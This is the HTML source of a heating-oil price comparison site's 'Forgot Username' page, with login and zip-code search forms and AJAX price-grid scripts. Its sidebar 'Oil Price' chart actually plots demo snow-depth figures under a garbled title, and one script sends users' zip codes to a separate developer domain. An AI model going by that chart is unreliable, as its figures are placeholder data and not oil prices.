
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Current Heating Oil Prices, Domestic Heating Oil Prices, Cheapest Home Heating Oil Price, Fuel Oil, Local, Home, Domestic, NY,  New York</title>
<meta name="description" content="Heatingoil4less.com is committed to identify and understand your needs, and provide the best solution in today�s oil prices like domestic heating oil prices, NY current oil heating prices, cheapest domestic heating oil, New York home heating oil services." />
<!-- Latest compiled and minified CSS -->

<meta name="keywords" content="Current prices for heating oil, Current oil heating prices, Current prices of heating oil, Current heating oil prices, Local heating oil prices, Heating oil prices, Heating fuel oil prices, Home heating oil, Current oil heating prices NY, Cheapest heating oil prices, NY Current oil heating prices, Domestic heating oil prices, Heating fuel oil price, Current oil heating prices New york, New york heating oil prices, fuel oil in nassau county, classic oil fair field, danek fuel in suffolk, dyno fuel in suffolk county, dyno fuel nassau county NY, fuel oil in suffolk county, heating oil in fairfield county, heating oil in nassau county, heating oil in suffolk county, heating oil in suffolk county NY, heating oil price in nassau county NY, heating oil price in suffolk county, indigo fuel in nassau county " />
<link rel="shortcut icon" href="images/favicon.ico"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=1165,initial-scale=1">
	
<!--[if lte IE 6]>
		<script type="text/javascript" src="js/pngfix.js"></script>
		<script type="text/javascript" src="js/ie6.js"></script>
		<link rel="stylesheet" href="css/ie6.css" type="text/css" />

	<![endif]-->



<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js" type="text/javascript"></script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap-theme.min.css">
<link rel="stylesheet" href="http://code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script src="js/script.js"></script>
<script src="js/stuHover.js" type="text/javascript"></script>
<script type="text/javascript" src="javascripts/prototype.js"> </script> 
<script type="text/javascript" src="javascripts/window.js"> </script> 
<script language="javascript" src="js/validator.js"></script>
<script language="javascript" src="js/functions.js"></script>
<script src="http://code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
<script language="javascript" src="js/sweetalert.min.js"></script>

<script language="javascript" type="text/javascript" src="js/dropdown.js"></script>
<script language="javascript" type="text/javascript" src="js/dynamic_content.js"></script>
<script language="javascript" type="text/javascript" src="js/responsive-tabs.js"></script>
<script language="javascript" type="text/javascript" src="js/html5lightbox.js"></script>
<link href="css/menu-css.css" rel="stylesheet" type="text/css">
<link href="css/hholstyles.css" rel="stylesheet" type="text/css" />
<link href="css/default.css" rel="stylesheet" type="text/css"> 
<link href="css/sweetalert.css" rel="stylesheet" type="text/css"> 
<link href="css/responsive-tabs.css" rel="stylesheet" type="text/css"> 
<script src="http://code.highcharts.com/highcharts.js"></script>
<script src="http://code.highcharts.com/highcharts-3d.js"></script>
<script src="http://code.highcharts.com/modules/exporting.js"></script>
<link href="css/alphacube.css" rel="stylesheet" type="text/css"> 
<title>Current Heating Oil Prices, Domestic Heating Oil Prices, Cheapest Home Heating Oil Price, Fuel Oil, Local, Home, Domestic, NY,  New York</title>
<meta name="description" content="Heatingoil4less.com is committed to identify and understand your needs, and provide the best solution in today�s oil prices like domestic heating oil prices, NY current oil heating prices, cheapest domestic heating oil, New York home heating oil services." />
<meta name="keywords" content="Current prices for heating oil, Current oil heating prices, Current prices of heating oil, Current heating oil prices, Local heating oil prices, Heating oil prices, Heating fuel oil prices, Home heating oil, Current oil heating prices NY, Cheapest heating oil prices, NY Current oil heating prices, Domestic heating oil prices, Heating fuel oil price, Current oil heating prices New york, New york heating oil prices" />
<meta name="viewport" content="width=1165,initial-scale=1">

<style type="text/css">
.handcursor{
	cursor:hand;
	cursor:pointer;
}
</style>
<script type="text/javascript">
jQuery(document).ready(function($){
	$('.form_sp select').change(function(e){
		$('.form_sp').submit();
	});

});
</script>
<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,600,600italic,300italic,300,700,700italic,800' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300,300italic,400italic,700,700italic' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
<link href="css/style.css" rel="stylesheet" type="text/css" />
</head>
<body>
<center>
</center>
<!-- Wrapper -->
<div id="wrapper">
<!-- Header Top Box -->
	<div class="headerTop">
	  <div class="headerTopInner">
					<form method="POST"  name="loginheader" onSubmit="return formloginvalidation()" class="loginform">
    			<div class="loginform">
                <input name="username" type="text" class="fild" value="username"  id="t_usernameheader"  onclick="this.value='';"  size="10"  onFocus='handleField("in");' onBlur='handleField("out");'/>
				<input name="password" type="password" class="fild" value="password" id="t_passwordheader"  onclick="this.value='';"  size="10"  onFocus='handleField1("in");' onBlur='handleField1("out");' />
				<input type="hidden"   name="SignIn"    value="SignIn"/>
				<input type="submit" name="loginsubmit"  value="" class="formbutton"/>
                </div>
				<div class="rememberme"><input name="remember" type="checkbox" value="remember" class="check" /></div>
                <div class="rememberme-text">Remember me</div>
                <span>
                    <a href="forgotpassword.php">Forgot your password?</a>
                    <a href="forgotusername.php">Forgot your username?</a>
                    <font color="#b281ff"><b>No account yet?</b></font>
                    <a href="registration.php">Create an account</a>
                </span>
			</form>
				
	  </div>
	</div>

<div class="menu-wrapper">
<div id='cssmenu'>
	<ul>
		<li><a href="index.php"><span>Home</span></a></li>
		<li><a href="aboutus.php"><span>About us</span></a></li>
		<li class='has-sub'><a href="#"><span class="down">Services</span></a>
            <ul class="sub">
                <li> <a href="automaticdelivery.php">Automatic Delivery</a>  </li>
                <li><a href="automaticreminders.php">Automatic Reminders</a> </li>
                                <li><a href="newservices_contracts.php">Service Contracts</a> </li>
                <li><a href="services.php?id=1">Burner Installation</a> </li>
                                <li><a href="services.php?id=2">Burner Repair</a> </li>
                <li><a href="services.php?id=3">C/A Installations</a>  </li>
                <li><a href="services.php?id=5">Emergency Services</a> </li>
            </ul>
        </li>
		<li><a href="testimonials.php"><span>Testimonials</span></a></li>
		<li><a href="opportunities.php"><span>Opportunities</span></a></li>
		<li class="top"><a href="resources.php"><span class="down">Resources</span></a>
            <ul class="sub">
                <li><a href="calculators.php">Calculators</a></li>
                <li><a href="news.php">News</a></li>
                <li><a href="weather.php">Weather</a></li>
                <li><a href="http://www.oilandgasinternational.com/" target="_blank">Oil and Gas International</a></li>
                <li><a href="http://energy.ihs.com/" target="_blank">IHS</a></li>
                <li><a href="http://www.worldoil.com/" target="_blank">World Oil</a></li>
            </ul>
		</li>
		<li><a href="faq.php"><span>Faq</span></a></li>
		<li><a href="contact.php"><span>Contact</span></a></li>
        <li class="searchli">
        	<div class="searchBox">
            	<form method="POST" action="index.php?search=homesearch" onsubmit="return validate()" name="zipsearch">
				<div class="fildBg">
					<input name="buyerzip" type="text"  value="" onclick="this.value='';"  size="10" maxlength="20" onFocus='handleFieldbuyerzip("in");' onBlur='handleFieldbuyerzip("out");'/>
				</div>
				<input type="submit" class="button" value=""/>
				</form>
			</div>
        </li>
	</ul>
	<form action="" method="get" class="form_sp">
        	<select name="language">
        		<option value="spanish" >Spanish</option>
        		<option value="english" >English</option>
        	</select>
	
        </form>
	<div class="cl"></div>
</div>
</div>
<div class="main_banner">
<div class="box_price"><p>Our best price today is</p><input type="text" value="$" style="width:100%" readonly /></div>
	<div class="main-banner-wrapper">
		<div class="banner-left"><img src="images/drop.png" class="banner-left-img" /></div>
        <div class="banner-mid" style="position:relative;">
			<a id="logo" href="http://www.heatingoil4less.com/">HeatingOil4Less.com</a>
			<div class="every_oil" style="position:absolute;left:-60px;"><img src="images/paying-for-oil.png"/></div>
			<div class="text_banner" style="position:absolute;width: 460px;left: 280px;top:50px;">
        	<h2>Welcome to heatingoil4less</h2>
        	<h3>We search through a range of local suppliers in your area to give you their cheapest available price.</h3>
            <div class="banner-read-more"><a href="testimonials.php"><img src="images/read-more-banner.png" class="banner-read-more" /></a></div>
            </div>
        </div>
<!--         <div class="banner-right">
        	<a href="press_release.php"><img src="images/banner-press.png" class="banner-press" /></a>
        </div> -->
    </div>
    <br class="spacer" />
</div>
<!-- Header Top Box End -->
<br class="spacer" />
<!-- Main Contaner -->
<div id="mainCntr" class="siteWidth">
	<!--<div id="headerCntr">
		<h1><a href="index.php">Heating oil</a></h1>
		<div class="headerRight">
			<a href="press_release.php"><img src="images/press.jpg" alt="press" class="press" /></a>
			  		    <div>
				<span id="siteseal">
                	<script type="text/javascript" src="https://seal.godaddy.com/getSeal?sealID=xrN4hl6DtPgefJ4RBEchz7mpkbYvBFN1A6FxbWZFwB7uMFo566mYsiJz"></script><br/>
                </span>
			</div>
		</div>
		<div class="cl"></div>
		<div class="headerSub">

			<div class="sub">

				<div class="logonBox">
					<h2>Log On</h2>
					<img src="images/img1.jpg" alt="" />
					<p>If you are already a member, simply type in your email address and password. If you are not a member, take a moment to input your profile.</p>
				</div>

				<div class="choseBox">
					<h2>Choose the Best Rate</h2>
					<img src="images/img2.jpg" alt="" />
					<p>Choose the Best Rate in your area. THREE HUNDRED suppliers are competing for your bussiness.</p>
				</div>

				<div class="savingBox">
					<h2>Enjoy the Savings</h2>
					<img src="images/img3.jpg" alt="" class="pic" />
					<p>You will save on EVERY Oil Delivery from us, NO QUESTION.
					</p><a href="testimonials.php" class="link"><img src="images/readmore.jpg" alt="readmore" /></a>
				</div>

			</div>

			<div class="headerWelcome">
				<h2>Welcome to our site</h2>
				<p>We search through a range of local suppliers in your area to give you their cheapest available price.</p>
				<div class="readmore"><a href="testimonials.php"><img src="images/readmore2.jpg" alt="read more" /></a></div>
			</div>

			<div class="cl"></div>

		</div>
	</div>-->
<script>
jQuery(document).ready(function($){

});
function handleField(type){
	if(type == 'in' && document.loginheader.username.value == 'username'){
	document.loginheader.username.value = '';
}
if(type == 'out' && document.loginheader.username.value == ''){
	document.loginheader.username.value = 'username';
	}
}

function handleField1(type){
	if(type == 'in' && document.loginheader.password.value == 'password'){
	document.loginheader.password.value = '';
}
if(type == 'out' && document.loginheader.password.value == ''){
	document.loginheader.password.value = 'password';
}
}
</script>
	
<script>
function formloginvalidation(){
if(document.loginheader.username.value=="username"){
alert("Please Enter  Username")
document.loginheader.username.focus();
return false;
}

if(document.loginheader.password.value=="password"){
alert("Please Enter  Password")
document.loginheader.password.focus();
return false;
}
return true;
}


function handleFieldbuyerzip(type){
if(type == 'in' && document.zipsearch.buyerzip.value == 'Enter Zip Code'){
	document.zipsearch.buyerzip.value = '';
}

if(type == 'out' && document.zipsearch.buyerzip.value == ''){
	document.zipsearch.buyerzip.value = 'Enter Zip Code';
}
}

// form fields description structure
var a_fields = {
	'buyerzip':{'l':'Zip','f':'integer','t':'t_buyerzip'}
},

o_config = {
	'to_disable' : ['enter'],
	'alert' : 1
}

var zipsearch = new validator('zipsearch', a_fields, o_config);
function validate(){
	if(document.zipsearch.buyerzip.value == 'Enter Zip Code' || document.zipsearch.buyerzip.value == ''	){
		alert("Enter zip code");
		document.zipsearch.buyerzip.focus();
		return false;
}else{
logfileexcute();
return true;
}
}
</script>

<script>
//logfile excute code here
var req = createXMLHttpRequest();  
function createXMLHttpRequest() {  
 var ua;  
 if(window.XMLHttpRequest) {  
 try {  
  ua = new XMLHttpRequest();  
 } catch(e) {  
  ua = false;  
 }  
 } else if(window.ActiveXObject) {  
  try {  
    ua = new ActiveXObject("Microsoft.XMLHTTP");  
  } catch(e) {  
    ua = false;  
  }  
 }  
return ua;  
}  

function logfileexcute()
{
buyerzip =  document.zipsearch.buyerzip.value;
var url="http://www.techomkar.com/heatingoil4less/logfilecreate.php";
url = url+"?buyerzip="+buyerzip;
req.open("GET",url,true);
req.send(null);
} 
</script>
		<!-- Content Contaner Start -->
		<div id="contentCntr">

			<!-- Left Container -->
			<div id="leftCntr">

				<!-- Free Quote Box -->
				<div class="freeQuoteBox">

		

<div class="credit_info"><a href="#" target="_blank"><p>Get an instant HO4L Credit Card</p></a></div>
				<div><a href="howtoorder.html" target="_blank"><img img src="images/howtoapply.png" style="cursor:pointer;padding-bottom:15px;padding-top:2px;width:140px;"></a></div>
				

				<h3 style="margin: 10px 0 0 0;">Watch Video</h3>					
				<div class="videoBox" style="margin-top:10px;">
				<a href="#mydiv" class="html5lightbox" data-width="800" data-height="400"><img src="images/video1.jpg" alt="" style="cursor:pointer;width:155px;"></a>
					
				</div>
				<div class="videoBox">
					<img src="images/video2.jpg" alt="" onclick="dialog2();" style="cursor:pointer;width:155px;">
				</div>		

				<!--copy begin here:-->
<!--<div style="text-shadow:none;width:153px;height:50px;text-align:center;margin-left:5px;"><div id="xcolors7_1" style="text-shadow:none;border:1px solid #000;background-color:#94abf0;padding: 0px 0px;margin: 0px 0px;align:center;overflow:hidden;"><div id="xcolors7_2" style="text-shadow:none;font-size:12px;color:#183a00;line-height:16px;font-family: arial; font-weight:bold;background:#94abf0;padding: 3px 1px;text-align:center;"><a href="http://oiloilprice.com/" alt="Heating Oil Price" title="Heating Oil Price" id="oilus4_link" style="text-shadow:none;color:#000000;font-size:14px;text-decoration:none;line-height:16px;font-family: arial;" >Heating Oil(USD)</a></div><script src="http://oiloilprice.com/zc.php?z=HeatingOil&c=94abf0&tz=America/New_York&tf=1"></script></div><div style="text-shadow:none;text-align:center;"><a href="http://oiloilprice.com/" style="text-shadow:none;font-size:12px;">Heating Oil Price</a></div></div> -->


<div id="map_container" style="min-width: 50px; height: 400px; margin: 0 auto"></div>

<script type="text/javascript">
jQuery(document).ready(function($){
    $('#map_container').highcharts({
        chart: {
            type: 'spline'
        },
        title: {
            text: 'Oil Price Last 6 common_test_cron_helper_cron()'
        },
        subtitle: {
            text: ''
        },
        xAxis: {
            type: 'datetime',
            dateTimeLabelFormats: { // don't display the dummy year
                month: '%e. %b',
                year: '%b'
            },
            title: {
                text: 'Date'
            }
        },
        yAxis: {
            title: {
                text: 'Snow depth (m)'
            },
            min: 0
        },
        tooltip: {
            headerFormat: '<b>{series.name}</b><br>',
            pointFormat: '{point.x:%e. %b}: {point.y:.2f} m'
        },

        plotOptions: {
            spline: {
                marker: {
                    enabled: true
                }
            }
        },

        series: [{
            name: 'Winter 2012-2013',
            // Define the data points. All series have a dummy year
            // of 1970/71 in order to be compared on the same x axis. Note
            // that in JavaScript, months start at 0 for January, 1 for February etc.
            data: [
                [Date.UTC(1970, 9, 21), 0],
                [Date.UTC(1970, 10, 4), 0.28],
                [Date.UTC(1970, 10, 9), 0.25],
                [Date.UTC(1970, 10, 27), 0.2],
                [Date.UTC(1970, 11, 2), 0.28],
                [Date.UTC(1970, 11, 26), 0.28],
                [Date.UTC(1970, 11, 29), 0.47],
                [Date.UTC(1971, 0, 11), 0.79],
                [Date.UTC(1971, 0, 26), 0.72],
                [Date.UTC(1971, 1, 3), 1.02],
                [Date.UTC(1971, 1, 11), 1.12],
                [Date.UTC(1971, 1, 25), 1.2],
                [Date.UTC(1971, 2, 11), 1.18],
                [Date.UTC(1971, 3, 11), 1.19],
                [Date.UTC(1971, 4, 1), 1.85],
                [Date.UTC(1971, 4, 5), 2.22],
                [Date.UTC(1971, 4, 19), 1.15],
                [Date.UTC(1971, 5, 3), 0]
            ]
        }, {
            name: 'Winter 2013-2014',
            data: [
                [Date.UTC(1970, 9, 29), 0],
                [Date.UTC(1970, 10, 9), 0.4],
                [Date.UTC(1970, 11, 1), 0.25],
                [Date.UTC(1971, 0, 1), 1.66],
                [Date.UTC(1971, 0, 10), 1.8],
                [Date.UTC(1971, 1, 19), 1.76],
                [Date.UTC(1971, 2, 25), 2.62],
                [Date.UTC(1971, 3, 19), 2.41],
                [Date.UTC(1971, 3, 30), 2.05],
                [Date.UTC(1971, 4, 14), 1.7],
                [Date.UTC(1971, 4, 24), 1.1],
                [Date.UTC(1971, 5, 10), 0]
            ]
        }, {
            name: 'Winter 2014-2015',
            data: [
                [Date.UTC(1970, 10, 25), 0],
                [Date.UTC(1970, 11, 6), 0.25],
                [Date.UTC(1970, 11, 20), 1.41],
                [Date.UTC(1970, 11, 25), 1.64],
                [Date.UTC(1971, 0, 4), 1.6],
                [Date.UTC(1971, 0, 17), 2.55],
                [Date.UTC(1971, 0, 24), 2.62],
                [Date.UTC(1971, 1, 4), 2.5],
                [Date.UTC(1971, 1, 14), 2.42],
                [Date.UTC(1971, 2, 6), 2.74],
                [Date.UTC(1971, 2, 14), 2.62],
                [Date.UTC(1971, 2, 24), 2.6],
                [Date.UTC(1971, 3, 2), 2.81],
                [Date.UTC(1971, 3, 12), 2.63],
                [Date.UTC(1971, 3, 28), 2.77],
                [Date.UTC(1971, 4, 5), 2.68],
                [Date.UTC(1971, 4, 10), 2.56],
                [Date.UTC(1971, 4, 15), 2.39],
                [Date.UTC(1971, 4, 20), 2.3],
                [Date.UTC(1971, 5, 5), 2],
                [Date.UTC(1971, 5, 10), 1.85],
                [Date.UTC(1971, 5, 15), 1.49],
                [Date.UTC(1971, 5, 23), 1.08]
            ]
        }]
    });
});
</script>
<!--copy end here:-->







				</div>
				

				
				<!--<div style="padding-top:30px;">-->
				<!--Want to save the fee take this survey? <br/>-->
<!--				<img src="images/survey2.png" onclick="loadSurvey();">
				
				</div>	-->			

				<!--<div class="graphBox">-->
				<!-- omkar_6jan12
				<div  class="heatingoilpriceshome">
                 <script type="text/javascript" src="http://oilprice.com/widgets/oil-news.js"></script>
		        </div>
				-->
				<!--</div>-->
				

				<!-- omkar_6jan12
				<div class="graphBoxcrude">
						<script type="text/javascript"
							src="http://www.oil-price.net/TABLE2/gen.php?lang=en">
						</script>
						<noscript> <a href="http://www.oil-price.net/dashboard.php?lang=en#TABLE2">To get the oil price, please enable Javascript.</a>
						</noscript>
				</div>
				-->
				<!-- OilPrise Box End -->


			</div>

			
			<script>

		function sellersorderdetails(){

			gallons = document.zipcodedetails.gallons.value

			var paymethodvalue = 0;

			for (var i=0; i < document.zipcodedetails.paymethod.length; i++)
			   {
			   if (document.zipcodedetails.paymethod[i].checked)
				  {
				  var paymethod = document.zipcodedetails.paymethod[i].value;
				   paymethodvalue = 1;
				  }
			   }
 		   zipcode = document.zipcodedetails.zipcode.value

		   if(gallons==""){
		   alert("Please Enter Apporximate # of gallons");
		   return false;
		   }

		   if(gallons>5000){
		   alert("Please Enter Gallons between   1 Gallons To 5000  Gallons");
		   document.zipcodedetails.gallons.value ="";
		   document.zipcodedetails.gallons.focus();
		   return false;
		   }

	      if(isNaN(gallons)){
		   alert("Please Enter Valid Apporximate # of gallons");
		   document.zipcodedetails.gallons.value ="";
		   document.zipcodedetails.gallons.focus();
		   return false;
		  }

		   if(paymethodvalue==0){
		   alert("Please Select Form of payment");
		   return false;
		   }

		   if(zipcode==""){
		   alert("Please Enter Zip Code");
		   return false;
		   }

		    document.getElementById('demo_lin').style.display = 'none';
		    
		    document.getElementById('box_start').style.display = 'none';
		    document.getElementById("leftCntr").setAttribute("style","width:225px;");

	   if(paymethod=="cash"){
		   showgrid(gallons,paymethod,zipcode);
		   }else if(paymethod=="credit"){
		   showgrid1(gallons,paymethod,zipcode);
			}




				}





function showgrid(gallons,paymethod,zipcode)
{
if (gallons=="" || paymethod=="" || zipcode=="")
  {
  document.getElementById("orderBox").innerHTML="";
  return;
  }

if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {

  // code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("orderBox").innerHTML=xmlhttp.responseText;
	 document.getElementById('orderboxvalues').style.display = 'block';
    }
  }


xmlhttp.open("GET","sellersoilpricegrid.php?BuyerZip="+zipcode+"&gallons="+gallons+"&orderpaymethod="+paymethod,true);
xmlhttp.send();



}

function showgrid1(gallons,paymethod,zipcode)
{
if (gallons=="" || paymethod=="" || zipcode=="")
  {
  document.getElementById("orderBox").innerHTML="";
  return;
  }

if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {

  // code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("orderBox").innerHTML=xmlhttp.responseText;

	document.getElementById('orderboxvalues').style.display = 'block';
    }
  }


xmlhttp.open("GET","sellersoilpricegrid1.php?BuyerZip="+zipcode+"&gallons="+gallons+"&orderpaymethod="+paymethod,true);
xmlhttp.send();



}


			function refersorderbox(){

			document.order.gallons.value  = "";
			document.order.price.value  = "";
			document.order.totalcostinput.value  = "";
			document.order.maxprice.value  = "";
			document.getElementById("selleriddiv").innerHTML = "";
			document.order.localtax.selectedIndex = "select";


			}

			function orderbyheading(orderbyhere){

			gallons = document.zipcodedetails.gallons.value

			var paymethodvalue = 0;

			for (var i=0; i < document.zipcodedetails.paymethod.length; i++)
			   {
			   if (document.zipcodedetails.paymethod[i].checked)
				  {
				  var paymethod = document.zipcodedetails.paymethod[i].value;
				   paymethodvalue = 1;
				  }
			   }
 		   zipcode = document.zipcodedetails.zipcode.value

		   if(gallons==""){
		   alert("Please Enter Apporximate # of gallons");
		   return false;
		   }

		   if(gallons>5000){
		   alert("Please Enter Gallons between   1 Gallons To 5000  Gallons");
		   document.zipcodedetails.gallons.value ="";
		   document.zipcodedetails.gallons.focus();
		   return false;
		   }

	      if(isNaN(gallons)){
		   alert("Please Enter Valid Apporximate # of gallons");
		   document.zipcodedetails.gallons.value ="";
		   document.zipcodedetails.gallons.focus();
		   return false;
		  }

		   if(paymethodvalue==0){
		   alert("Please Select Form of payment");
		   return false;
		   }

		   if(zipcode==""){
		   alert("Please Enter Zip Code");
		   return false;
		   }

	   if(paymethod=="cash"){
		   showgrid3(gallons,paymethod,zipcode,orderbyhere);
		   }else if(paymethod=="credit"){
		   showgrid4(gallons,paymethod,zipcode,orderbyhere);
			}






		}

		function showgrid3(gallons,paymethod,zipcode,orderbyhere)
{
if (gallons=="" || paymethod=="" || zipcode=="")
  {
  document.getElementById("orderBox").innerHTML="";
  return;
  }

if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {

  // code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("orderBox").innerHTML=xmlhttp.responseText;
	 document.getElementById('orderboxvalues').style.display = 'block';
    }
  }


xmlhttp.open("GET","sellersoilpricegrid.php?BuyerZip="+zipcode+"&gallons="+gallons+"&orderpaymethod="+paymethod+"&priceorderid="+orderbyhere,true);
xmlhttp.send();

}

function showgrid4(gallons,paymethod,zipcode,orderbyhere)
{
if (gallons=="" || paymethod=="" || zipcode=="")
  {
  document.getElementById("orderBox").innerHTML="";
  return;
  }

if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {

  // code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("orderBox").innerHTML=xmlhttp.responseText;

	document.getElementById('orderboxvalues').style.display = 'block';
    }
  }


xmlhttp.open("GET","sellersoilpricegrid1.php?BuyerZip="+zipcode+"&gallons="+gallons+"&orderpaymethod="+paymethod+"&priceorderid="+orderbyhere,true);
xmlhttp.send();



}


			function griddispalyenterbutton(e){
					e = e || window.event;
					var code = e.keyCode || e.which;
					if(code == 13){
							sellersorderdetails();
							refersorderbox();
							logfileexcute();
					}
   }


			</script>


<script>
//logfile excute code here
var req = createXMLHttpRequest();
function createXMLHttpRequest() {
 var ua;
 if(window.XMLHttpRequest) {
 try {
  ua = new XMLHttpRequest();
 } catch(e) {
  ua = false;
 }
 } else if(window.ActiveXObject) {
  try {
    ua = new ActiveXObject("Microsoft.XMLHTTP");
  } catch(e) {
    ua = false;
  }
 }
return ua;
}

function logfileexcute()
{
buyerzip =  document.zipcodedetails.zipcode.value;
var url="logfilecreate.php";
url = url+"?buyerzip="+buyerzip;
req.open("GET",url,true);
req.send(null);
}

function loadSurvey(){

	var url= "http://www.zoomerang.com/Survey/WEB22EPQ9GFCPU";
	
	window.open(url,'attchements','left=300,top=300,width=800,height=600,scrollbars=yes');

}

</script>			<!-- Left Container End -->


			<!-- Right Container -->
			<div id="rightCntr">

				<!-- Left Start -->
				<div class="left">
                   
		
		     <table width="100%" border="0" cellpadding="0" cellspacing="1">
                    <tr>
					<td><p class="title" style="padding-left:10px;">Forgot Username</p></td>

                    </tr>
					<tr height="20">
					<td>&nbsp;</td>

                    </tr>

                  </table>	
				 

                    <table width="100%" border="0" cellpadding="5" cellspacing="1">
                      <tr>
                        <td align="left" valign="top" bgcolor="#FFFFFF" >
												
						</td>
                      </tr>
                  </table> 
						
						<table width="100%" border="0" cellspacing="0" cellpadding="0">
						  <tr>
						
						    <form method="POST"  name='registration' onsubmit="return vforgotpassword.exec();" >
                            <td align="right" valign="middle" class="content"  id="t_username_forgot_password">Enter Username </td>
                            <td align="center" valign="middle" class="content">:</td>
                            <td align="left" valign="middle"><input name="username_forgot_password" type="text" class="username" size="25" />&nbsp;<span class='salesreceiptnamehead'>*</span></td>
							
                          </tr>
                          <tr height="20">
					<td>&nbsp;</td>

                    </tr>
                          <tr>
						  
                            <td align="right" valign="middle" class="tblcontent">&nbsp;</td>
                            <td align="left" valign="middle">&nbsp;</td>
                            <td align="left" valign="middle">
								<input name="submit" type="hidden"  value="Submit" />
								<input name="submitbutton" type="submit" class="button" value="Submit" />
								<input name="reset" type="reset" class="button" value="Reset" />
                    			<input name="cancel" type="button" class="button" id="cancel" value="Cancel" onClick="history.go(-1)" />
								</td>
                          </form>
						  
						  </tr>
                        </table>
				  
		

				</div>
				<!-- Left Box End -->

				<!-- Right Start -->
				<div class="right">
<!-- Message Box Start -->
	<h2>Message Board</h2>
	<div class="messageBox">
		<center><b style="color:#9f8ebc;">Today is Friday 04-14-17</b></center>
		<br>
		<center>
				        THE COLD TEMPERATURES ARE STILL HANGING ON.  DO NOT BE LEFT IN THE COLD PLACE YOUR ORDER TODAY.  		</center>
	</div>
   <div id="rightBottomCntr">
    <div class="wrapper">
        <div class="box">
            <img src="images/ad1.png" border="0" usemap="#Map3" width="190" />
            <map name="Map3" id="Map3">
              <area shape="rect" coords="190,82,279,109" href="services.php?id=5" />
            </map>
        </div>
        <div class="box">
        	<img src="images/ad2.png" border="0" usemap="#Map2" width="190" />
            <map name="Map2" id="Map2">
              <area shape="rect" coords="190,82,280,109" href="newservices_contracts.php" />
            </map>
        </div>
        <div class="box">
            <img src="images/ad3.png" border="0" usemap="#Map3" width="190" >
            <map name="Map" id="Map">
              <area shape="rect" coords="190,81,279,109" href="newservices_contracts.php" />
            </map>
        </div>
   		<div class="cl"></div>
   </div>
</div>
	<!--<div class="videoBox">
		<img src="images/video3.jpg" alt="" onClick="dialog3();" style="cursor:pointer"/>
	</div>-->
</div> 
<script type="text/javascript">

function dialog1() {
 new Window({url: "http://www.heatingoil4less.com/introduction.html", className: "alphacube",width:530,height:400,top:500, left:300 }).show()
  WindowCloseKey.init();
}

function dialog2() {
 new Window({url: "http://www.heatingoil4less.com/whytry.html", className: "alphacube",width:530,height:400,top:500, left:300 }).show()
  WindowCloseKey.init();
}

function dialog3() {
 new Window({url: "http://www.heatingoil4less.com/greatservice.html", className: "alphacube",width:530,height:400,top:500, left:300 }).show()
  WindowCloseKey.init();
}

function howtoapply() {
 new Window({url: "http://www.heatingoil4less.com/howtoorder.html", className: "alphacube",width:530,height:400,top:250, left:500 }).show()
  WindowCloseKey.init();
}
</script>				<!-- Right Box End -->

				<div class="cl"></div>

			

			</div>
			<!-- Right Container End -->

			<div class="cl"></div>
		</div>
		<!-- Content Contaner End -->

	</div>
	<!-- Main Contaner End -->

	<!-- Footer Contaner Start -->
	<div id="footerCntr">
	<div id="footerCntrInner">
		<div class="left">
			<a href="index.php">Home</a>  |  
            <a href="services.php">Services</a>  |  
            <a href="testimonials.php">Testimonials</a>  |  
            <a href="opportunities.php"> Opportunities </a>  |  
            <a href="resources.php">Resources </a>  |  
            <a href="faq.php"> Faq </a>  |   
            <a href="aboutus.php">About Us</a>  |  
            <a href="contact.php"> Contact Us </a>  |  
            <a href="sitemap.xml"> Xml Sitemap </a>  |  
            <a href="rss.xml"> Rss</a>
            <br/>
            <div class="footer-bottom">
				<p align="center" class="footer-copyright">
            		&copy; 2017 Heatingoil4less.com. All Rights Reserved. 
            	</p>
